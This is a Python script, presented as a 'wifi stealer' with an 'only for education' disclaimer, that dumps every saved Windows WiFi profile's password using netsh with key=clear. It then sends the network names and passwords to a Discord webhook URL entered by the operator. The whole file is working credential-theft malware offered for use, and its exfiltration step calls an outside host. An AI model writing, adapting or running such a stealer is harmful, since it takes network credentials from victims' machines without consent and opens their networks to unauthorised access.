# ---------- Automatic wifi stealer with Discord webhook ----------
#
# ----------------------- IMPORTANT -----------------------
# ---------- This programm is only for eduction! ----------
# ---------- Im not responsible for any damage! ----------
# ---------------------------------------------------------

# ---------- Import of all important modules for the project ----------

import subprocess
import re
from dhooks import Webhook
import colorama
from colorama import Fore, Back, Style
from colorama import init
from termcolor import colored
colorama.init(autoreset=True)

# ---------- Title of the project // Bar to beautify the UI ----------

print(f"""{Fore.BLUE}
░██╗░░░░░░░██╗██╗███████╗██╗  ░██████╗████████╗███████╗░█████╗░██╗░░░░░███████╗██████╗░
░██║░░██╗░░██║██║██╔════╝██║  ██╔════╝╚══██╔══╝██╔════╝██╔══██╗██║░░░░░██╔════╝██╔══██╗
░╚██╗████╗██╔╝██║█████╗░░██║  ╚█████╗░░░░██║░░░█████╗░░███████║██║░░░░░█████╗░░██████╔╝
░░████╔═████║░██║██╔══╝░░██║  ░╚═══██╗░░░██║░░░██╔══╝░░██╔══██║██║░░░░░██╔══╝░░██╔══██╗ 
░░╚██╔╝░╚██╔╝░██║██║░░░░░██║  ██████╔╝░░░██║░░░███████╗██║░░██║███████╗███████╗██║░░██║ █░█░█ █ ▀█▀ █░█   █▀▄ █ █▀ █▀▀ █▀█ █▀█ █▀▄   █░█░█ █▀▀ █▄▄ █░█ █▀█ █▀█ █▄▀
░░░╚═╝░░░╚═╝░░╚═╝╚═╝░░░░░╚═╝  ╚═════╝░░░░╚═╝░░░╚══════╝╚═╝░░╚═╝╚══════╝╚══════╝╚═╝░░╚═╝ ▀▄▀▄▀ █ ░█░ █▀█   █▄▀ █ ▄█ █▄▄ █▄█ █▀▄ █▄▀   ▀▄▀▄▀ ██▄ █▄█ █▀█ █▄█ █▄█ █░█ 
{Fore.GREEN}
▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼
""")

# ---------- Input command so that you can enter the webhook URL // coloured ----------

hook = print(Fore.GREEN + "Enter webhook URL: ", end='')
Webhook1 = input()

# ---------- Redefining the variable ----------

hook = Webhook(Webhook1)

# ---------- Commands to find out the Wlan passwords and connections ----------

command_output = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output = True).stdout.decode()

profile_names = (re.findall("All User Profile     : (.*)\r", command_output))

wifi_list = []

if len(profile_names) != 0:
    for name in profile_names:

        wifi_profile = {}

        profile_info = subprocess.run(["netsh", "wlan", "show", "profile", name], capture_output = True).stdout.decode()

        if re.search("Security key           : Absent", profile_info):
            continue
        else:

            wifi_profile["Wifi"] = name

            profile_info_pass = subprocess.run(["netsh", "wlan", "show", "profile", name, "key=clear"], capture_output = True).stdout.decode()

# ---------- Convert the output to a variable ----------

            password = re.search("Key Content            : (.*)\r", profile_info_pass)

            if password == None:
                wifi_profile["Password"] = None
            else:

                wifi_profile["Password"] = password[1]

            wifi_list.append(wifi_profile)

# ---------- Output all WiFi connections and WiFi passwords ----------

print(" ")
print(Fore.GREEN + str(wifi_list))

# ---------- Send all WiFi connections and WiFi passwords to your Discord webhook ----------

hook.send(f"{wifi_list}")

# ---------- Spacers for a better overview ----------

print(" ")

# ---------- Note that the program is complete and the window can be closed ----------

print(f"{Fore.GREEN}Program complete you can close the window...")

# ---------- Bar to beautify the UI ----------

print(f"""{Fore.GREEN}
▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼
""")
input("""
 """)

